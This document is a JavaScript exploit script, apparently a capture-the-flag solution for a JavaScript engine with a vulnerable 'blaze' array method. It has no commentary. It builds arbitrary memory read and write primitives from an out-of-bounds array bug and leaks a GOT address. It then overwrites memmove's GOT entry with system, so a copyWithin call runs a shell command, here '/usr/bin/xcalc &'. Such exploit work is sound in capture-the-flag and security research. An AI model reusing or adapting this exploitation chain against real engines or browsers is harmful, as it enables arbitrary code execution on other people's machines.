
//Get the hexideciaal of a num (can be big nu())
function dec2hex(str){ // .toString(16) only works up to 2^53
    var dec = str.toString().split(''), sum = [], hex = [], i, s
    while(dec.length){
        s = 1 * dec.shift()
        for(i = 0; s || i < sum.length; i++){
            s += (sum[i] || 0) * 10
            sum[i] = s % 16
            s = (s - sum[i]) / 16
        }
    }
    while(sum.length){
        hex.push(sum.pop().toString(16))
    }
    return '0x' + hex.join('')
}

//Given a double will return a decimal
function double2dec(d){

    var buffer = new ArrayBuffer(8)
    var float64 = new Float64Array(buffer)
    var int64 = new BigUint64Array(buffer)

    float64[0] = d

    var ret = int64[0]

    return ret;
}

//Given a int will return a decimal
function dec2double(d){

  var buffer = new ArrayBuffer(8)
  var float64 = new Float64Array(buffer)
  var int64 = new BigUint64Array(buffer)
  int64[0] = d
  var ret = float64[0]
  return ret;
}


function read64(addr){

  x = []
  y = new BigUint64Array(1)

  //Debugging
  y[0] = 0x1010101010101010n

  x.blaze()
  prev_val = x[13]
  x[13] = dec2double(addr)
  read_value = y[0]
  x[13] = double2dec(prev_val)
  return read_value
}

function write64(addr, value){

  x = []
  y = new BigUint64Array(1)

  //Debugging
  y[0] = 0x1010101010101010n

  x.blaze()
  prev_val = x[13]
  x[13] = dec2double(addr)
  y[0] = value
  x[13] = double2dec(prev_val)
}

function leak_got(){

  x = []
  y = new BigUint64Array(1)
  //Debugging
  y[0] = 0x1010101010101010n

  x.blaze()
  array_offset = 8

  ptr_read = double2dec(x[array_offset])
  console.log("Pointer in .text: " + dec2hex(ptr_read))


  const mmap_start = -0x404c78n
  const got_start = 0x33c6000n

  top_got = ptr_read + mmap_start + got_start

  console.log("Got start: " + dec2hex(top_got))

  return top_got

}


system_cmd = "/usr/bin/xcalc &"
system_cmd_array = new Uint8Array(system_cmd.length + 1)

for (let i = 0; i < system_cmd.length; i++) {
  system_cmd_array[i] = system_cmd.charCodeAt(i) 
}
system_cmd_array[system_cmd.length + 1] = 0
console.log("Setted up the system command")

got_top = leak_got()

system_offset = 0x5a80n
system_addr = got_top + system_offset
console.log("System got @ " + dec2hex(system_addr))
system_ptr = read64(system_addr)
console.log("System plt @ " + dec2hex(system_ptr))


mem_move_offset = 0x5998n
mem_move_addr = got_top + mem_move_offset
console.log("Memmove got @ " + dec2hex(mem_move_addr))
mem_move_ptr = read64(mem_move_addr)
console.log("System plt @ " + dec2hex(mem_move_ptr))

console.log("Overwriting memmove got with system got ptr")
write64(mem_move_addr, system_ptr)

console.log("Running exploit")
system_cmd_array.copyWithin(0, 1);

console.log("Fixing memove got back to its orginal state")
write64(mem_move_addr, mem_move_ptr)


